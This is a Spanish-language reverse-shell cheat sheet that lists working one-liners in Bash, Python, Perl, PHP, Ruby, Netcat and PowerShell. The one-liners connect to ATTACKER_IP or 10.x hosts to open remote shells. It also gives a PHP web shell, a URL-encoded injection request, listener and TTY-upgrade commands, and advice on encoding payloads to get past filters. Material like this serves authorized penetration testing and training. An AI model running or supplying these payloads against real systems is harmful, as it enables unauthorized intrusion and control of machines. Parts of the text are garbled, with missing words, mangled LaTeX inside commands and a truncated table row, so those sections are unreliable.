
**php**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Bash**

`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`

**Python**

`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn("/bin/bash")'`

**Perl**

`perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

**PHP**

`<?php $s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>`

**Ruby**

`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

**Netcat (con -e)**

`nc -e /bin/sh ATTACKER_IP 4444`

**Netcat (sin -e, más portable)**

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f`

---



Una sola línea

```bash
bash -i >& /dev/tcp/10.10.10.10/8000 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/18000 0>&1'
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.10/5555+0>%261'
curl http://127.0.0.1:52846/shell.php?cmd='bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.10.10/5555%200%3E%261%27'

```

Bash-PHP

```bash

#!/bin/bash
php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

```


---

# Reverse Shells - Ejemplos, Casos de Uso y Detalles Técnicos

## ¿Qué es un Reverse Shell?

Un **Reverse Shell** (o 'shell inversa') es un método de conexión remota donde, a diferencia de una conexión tradicional (como  o ) donde el atacante se conecta a la víctima, es **la víctima quien inicia la conexión** hacia un 'escucha' () del atacante.

Esta técnica es crucial en ciberseguridad por dos razones principales:

1. **Evadir Firewalls 🧱:** Los firewalls de las organizaciones suelen bloquear las **conexiones entrantes** (de afuera hacia adentro) pero permiten la mayoría de las **conexiones salientes** (de adentro hacia afuera). Al ser la víctima quien inicia la conexión (saliente), a menudo **burla las reglas de filtrado**.
2. **Acceso Detrás de  / :** Si la víctima está detrás de un  o un router sin redirección de puertos, el atacante no podría iniciar la conexión directamente. El   soluciona esto, ya que **la víctima es la que 'llama a casa'**.

---

## ⚡ Forma de Uso General (El Esquema)

Para obtener un  , se necesitan dos componentes: el  **(Atacante)** y el  **(Víctima)**.

### 1. Preparar el  (Atacante)

El atacante debe **abrir un puerto** y esperar la conexión entrante. La herramienta más común es  **()**.

|**Herramienta**|**Comando (Ejemplo con puerto 1234)**|**Descripción**|
|---|---|---|
|**Netcat ()**|`nc -lvnp 1234`|(listen), (verbose), (no lookup), (port).|
||`ncat -lvp 1234`|Versión moderna de Netcat.|
||`socat \text{\text{raw}\text{echo}=0$|Más avanzado, puede obtener automáticamente.|

### 2. Ejecutar el  (Víctima)

La víctima ejecuta el código del   (el ) apuntando a la  **del atacante** y el **puerto del** .

### 3. Conexión Establecida

Una vez ejecutado el , la víctima se conecta al  del atacante, y el atacante obtiene una **línea de comandos interactiva** o **semi-interactiva**.

---

## ⚙️ Conseguir un  Semi-Interactivo (Mejora de Shell)

Los   iniciales (especialmente con  simple) a menudo son **"tontos"** ( ): no permiten usar flechas, autocompletar (), o limpiar la pantalla (). Para mejorar la experiencia, se requiere un  **semi-interactivo**.

### Pasos Comunes para Linux/Unix:

1. **Identificar el :** Ejecutar `python3 -c 'import pty; pty.spawn("/bin/bash")'` (si Python está disponible) para forzar un .
    
2. **Configuración del Terminal:**
    
    - Presionar  **+**  (pausa el shell, vuelve al ).  
        
    - En el  del atacante, ejecutar: `stty $\text{raw}$ $\text{echo}$; $\text{fg}$`  
        
    - Esto hace que el terminal del atacante sea "más inteligente" () y la señal de pausa () trae de vuelta el shell.  
        
3. **Ajuste de Variables:**
    
    - Ya en la shell: `export $\text{TERM}$=$\text{xterm}$`  
        
    - `stty $\text{rows}$ $X$ $\text{cols}$ $Y$` (Ajustar  e  a las dimensiones de la ventana del atacante).  
        

---

## Ejemplos de   (Actualizados y Detallados)

|**Lenguaje**|**Código del Reverse Shell (Ejemplo: IP: 10.0.0.1, Port: 1234)**|**Caso de Uso y Detalles**|
|---|---|---|
|**Bash**|`bash bash -i >& /dev/tcp/10.0.0.1/1234 0>&1`|**Sistemas Linux/Unix**. Usa el sistema de archivos especial `/dev/tcp/` para abrir una conexión. Es uno de los más rápidos si está disponible.|
|**Perl**|`perl perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`|**Sistemas con Perl instalado** (común en servidores antiguos). **Portabilidad:** Se basa en funciones de red de Perl, haciéndolo útil si Bash no funciona.|
|**Python**|`python python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'`|**Entornos con Python**, muy común en pentesting web. **Flexibilidad:** Usa la librería `subprocess` para ejecutar `/bin/bash` o `/bin/sh`.|
|**PHP**|`php php -r '$sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`|**Explotación de aplicaciones web** (p. ej., subiendo un webshell a través de una vulnerabilidad de carga de archivos).|
|**Netcat ()**|`bash nc -e /bin/sh 10.0.0.1 1234` **(Opción si funciona)**|**Comodín:** Funciona en muchos entornos. **Riesgo:** La opción (ejecutar) a menudo está **deshabilitada** en versiones modernas de por razones de seguridad.|
|**(FIFO)**|` bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|

---

## Ejemplos de   para Windows 🖥️

### PowerShell

PowerShell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- **Caso de Uso:** **Sistemas Windows modernos** (Windows 7+), donde PowerShell está disponible por defecto. Es el método preferido en entornos Windows sin herramientas externas.  
    

### Netcat (Opción)

Si se logró subir un ejecutable de  a la víctima (usando una versión de  compilada para Windows):

Bash

```
nc.exe 10.0.0.1 1234 -e cmd.exe
```

- **Caso de Uso:** Cuando es posible la transferencia de archivos y se necesita un shell rápido sin depender de PowerShell.  
    

### VBScript

VBScript

```
<Payload que usa el objeto $\text{WScript.Shell}$ para iniciar un socket y ejecutar $\text{cmd.exe}$>
```

- **Caso de Uso:** Entornos más restringidos o legacy donde PowerShell está deshabilitado, pero los scripts de Visual Basic son tolerados.  
    

---

## 🛡️ Consideraciones de Seguridad y Ética

- **Cambiar /Puerto:** Siempre se debe sustituir la  (`10.0.0.1`) y el puerto (`1234`) por los **del atacante** ().  
    
- **Codificación ():** En el mundo real, los  a menudo necesitan ser **codificados** (, -, etc.) para evadir filtros o funcionar en el contexto de la vulnerabilidad (p. ej., inyección en una cadena de ).  
    
- **Uso Ético:** El uso de   solo debe realizarse en **entornos controlados y autorizados** (pruebas de penetración legales, laboratorios de seguridad). Su uso no autorizado es un **delito informático**.